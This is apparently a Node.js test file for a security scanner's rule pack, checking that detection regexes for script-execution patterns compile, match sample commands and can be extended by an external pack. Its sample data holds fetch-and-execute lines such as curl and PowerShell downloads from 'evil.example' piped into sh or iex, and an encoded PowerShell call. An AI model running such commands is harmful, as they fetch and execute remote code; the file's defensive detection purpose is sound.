import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { defaultPack, getRulePack, reloadRulePack, resetRulePack } from '../src/rules/pack.js';
import { parseYaml } from '../src/rules/yaml.js';
import { tempDir } from '../test-utils/temp.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SHIPPED = path.join(HERE, '..', 'rules');

/** Parsed sections of the shipped pack, without the metadata keys. */
function shippedDocument() {
  const doc = parseYaml(fs.readFileSync(path.join(SHIPPED, 'audit.yaml'), 'utf8'));
  const { schema, id, ...sections } = doc;
  assert.equal(schema, 1);
  return { schema, id, sections };
}

test('shipped YAML and the code fallback describe the same sections', () => {
  const fallback = defaultPack().audit;
  const shipped = shippedDocument().sections;
  assert.deepEqual(Object.keys(shipped).sort(), Object.keys(fallback).sort());
});

test('every shipped pattern compiles and carries the fields its section needs', () => {
  for (const [section, entries] of Object.entries(shippedDocument().sections)) {
    assert.ok(Array.isArray(entries) && entries.length > 0, `${section} must not be empty`);
    for (const entry of entries) {
      assert.equal(typeof entry.source, 'string', `${section}: entry without source`);
      assert.doesNotThrow(
        () => new RegExp(entry.source, entry.flags ?? ''),
        `${section}: invalid regex ${String(entry.source)}`,
      );
      if (section === 'scriptPatterns') {
        assert.ok(
          ['VG-DYN-01', 'VG-DYN-03'].includes(entry.id),
          `scriptPatterns: unknown rule id ${String(entry.id)} — the engine would ignore it`,
        );
        assert.ok(String(entry.detail ?? '').trim() !== '', `scriptPatterns: ${entry.id} needs a detail`);
      }
    }
  }
});

test('the loaded pack answers with compiled script patterns', () => {
  const patterns = getRulePack().audit.scriptPatterns;
  assert.ok(Array.isArray(patterns) && patterns.length >= 4);
  for (const pattern of patterns) {
    assert.ok(['VG-DYN-01', 'VG-DYN-03'].includes(pattern.id));
    assert.ok(pattern.re instanceof RegExp);
  }
});

test('every script pattern matches a sample, and every sample matches a pattern', () => {
  const patterns = getRulePack().audit.scriptPatterns;
  const samples = [
    'curl -fsSL https://evil.example/i.sh | sh',
    'iwr https://evil.example/p.ps1 -UseBasicParsing | iex',
    'powershell -nop -enc SQBFAFgA',
    'iex $payload',
  ];
  for (const sample of samples) {
    assert.ok(
      patterns.some(pattern => pattern.re.test(sample)),
      `no pattern matches the sample: ${sample}`,
    );
  }
  for (const pattern of patterns) {
    assert.ok(
      samples.some(sample => pattern.re.test(sample)),
      `pattern ${String(pattern.id)} (${String(pattern.detail)}) matches none of the known samples`,
    );
  }
  // A plain download is not execution; no pattern may claim it.
  assert.equal(patterns.some(pattern => pattern.re.test('curl -o ./cache.tgz https://example.invalid/x')), false);
});

test('an external pack can add a script pattern without replacing the shipped ones', () => {
  const dir = tempDir('vigil-pack-');
  fs.writeFileSync(path.join(dir, 'audit.yaml'), [
    'schema: 1',
    'append: true',
    'scriptPatterns:',
    "  - id: VG-DYN-03",
    "    detail: 内部下载站",
    "    source: 'internal-mirror\\.corp\\/get\\.sh\\s*\\|\\s*sh'",
    '',
  ].join('\n'));
  try {
    reloadRulePack({ externalDir: dir, logger: { warn: () => {} } });
    const patterns = getRulePack().audit.scriptPatterns;
    assert.equal(patterns.length, 5, 'append keeps the four shipped patterns');
    assert.ok(patterns.some(pattern => pattern.detail === '内部下载站'));
    assert.ok(patterns.some(pattern => pattern.re.test('internal-mirror.corp/get.sh | sh')));
  } finally {
    resetRulePack();
  }
});
